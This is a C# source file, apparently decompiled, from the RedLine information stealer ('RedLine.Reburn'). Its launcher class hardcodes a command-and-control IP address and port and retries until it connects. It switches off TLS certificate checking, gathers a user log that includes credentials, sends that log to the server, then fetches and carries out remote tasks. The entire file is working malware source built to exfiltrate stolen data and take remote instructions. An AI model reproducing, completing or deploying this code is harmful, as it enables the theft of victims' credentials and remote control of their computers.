using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using RedLine.Reburn.Data.Core.LogParsers;
using RedLine.Reburn.Data.Extensions;
using RedLine.Reburn.Models.Core;
using RedLine.Reburn.Models.Info;

namespace RedLine.Reburn.Data.Core.Launchers;

public class DefaultAppLauncher : BaseAppLauncher
{
	protected ClientSettings clientSettings;

	protected UserLog userLog;

	protected ICommunicator Communicator;

	private string IP { get; }

	private string ID { get; }

	public DefaultAppLauncher(IEnumerable<IFileShield> fileShields = null)
		: base(fileShields)
	{
		IP = "198.23.172.50:35200";
		ID = "198";
	}

	public override BaseAppLauncher Init(ICommunicator communicator)
	{
		bool flag = false;
		while (!flag)
		{
			string[] array = IP.Split(new char[1] { '|' });
			foreach (string address in array)
			{
				if (communicator.InitConnection(address))
				{
					Communicator = communicator;
					flag = true;
					break;
				}
			}
			Thread.Sleep(5000);
		}
		try
		{
			ServicePointManager.SecurityProtocol |= SecurityProtocolType.Ssl3 | SecurityProtocolType.Tls | SecurityProtocolType.Tls12;
		}
		catch
		{
		}
		ServicePointManager.ServerCertificateValidationCallback = (RemoteCertificateValidationCallback)Delegate.Combine(ServicePointManager.ServerCertificateValidationCallback, (RemoteCertificateValidationCallback)((object _, X509Certificate __, X509Chain ___, SslPolicyErrors ____) => true));
		return this;
	}

	public override BaseAppLauncher Prepere(BaseLogParser LogParser)
	{
		while (!Communicator.TryGetSettings(out clientSettings))
		{
			Thread.Sleep(1000);
		}
		if (!LogParser.TryGet(clientSettings, out userLog))
		{
			Dispose();
		}
		userLog.BuildID = ID;
		return this;
	}

	public override BaseAppLauncher Report()
	{
		while (!Communicator.TrySendLog(userLog))
		{
			Thread.Sleep(1000);
		}
		UserLog log = userLog;
		userLog.Credentials = new Credentials();
		IList<RemoteTask> remoteTasks;
		while (!Communicator.TryGetTasks(userLog, out remoteTasks))
		{
			Thread.Sleep(1000);
		}
		remoteTasks = remoteTasks.IsNull(new List<RemoteTask>());
		foreach (int item in new TaskResolver(log, remoteTasks).Get() ?? new List<int>())
		{
			while (!Communicator.TryCompleteTask(userLog, item))
			{
				Thread.Sleep(1000);
			}
		}
		return this;
	}

	public override void Dispose()
	{
		Dispose(managed: true);
		GC.SuppressFinalize(this);
	}

	protected virtual void Dispose(bool managed)
	{
	}
}
